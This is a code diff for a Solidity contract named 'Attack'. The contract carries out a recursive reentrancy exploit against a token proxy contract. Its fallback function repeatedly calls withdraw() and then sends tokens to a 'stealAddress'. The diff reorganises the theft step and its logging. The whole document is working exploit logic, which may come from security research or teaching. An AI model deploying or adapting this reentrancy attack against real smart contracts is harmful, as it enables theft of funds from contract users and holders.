@@ -27,6 +27,7 @@ contract Attack {
   TWIProxy twi;
   address stealAddress;
   uint8 numTokens;
+  uint tokensInWei;
 
   /* Constructor */
   function Attack(address _contractAddress, address _stealAddress, uint8 _numTokens, uint _recursions) {
@@ -34,32 +35,19 @@ contract Attack {
     stealAddress = _stealAddress;
     numTokens    = _numTokens;
     recursions   = _recursions;
+    tokensInWei  = numTokens * conversion;
   }
-
-  /* Total supply stays constant wth transfer
-
-     withdraw decreases total supply
-     deposit.value increases it
-
-  */
-
 
   /* Default function. Always run */
   function() {
     if (performAttack) {
-      AttackLog("Increasing depth", depth + 1);
       depth = depth + 1;
-      AttackLog("Transfer tokens to other address", numTokens);
-      AttackLog("Current szabos", (uint8)(this.balance/conversion));
-      AttackLog("Current tokens", twi.balanceOf(this));
+      AttackLog("value", (uint)(this.balance/conversion));
       if (depth < recursions) {  /* attack again */
-        AttackLog("Recursively attacking", 99);
-        /* Transfer tokens to another address */
-        twi.transfer.value(numTokens*conversion)(stealAddress,numTokens);
-        AttackLog("stealy balance after", twi.balanceOf(stealAddress));
         twi.withdraw();
       } else {
-        AttackLog("Attack over", 99);
+        AttackLog("Transferring tokens", 99);
+        twi.transfer.value(recursions*tokensInWei)(stealAddress,numTokens);
         performAttack = false; /* turn off attack again*/
       }
     }
@@ -72,8 +60,8 @@ contract Attack {
   function attack() {
     depth = 0;
     performAttack = true;
-    /* Contract itself must have some funds */
-    twi.deposit.value(numTokens*conversion)(numTokens);
+    /* Contract itself must have some funds to make deposit*/
+    twi.deposit.value(tokensInWei)(numTokens);
     twi.withdraw();
   }
 
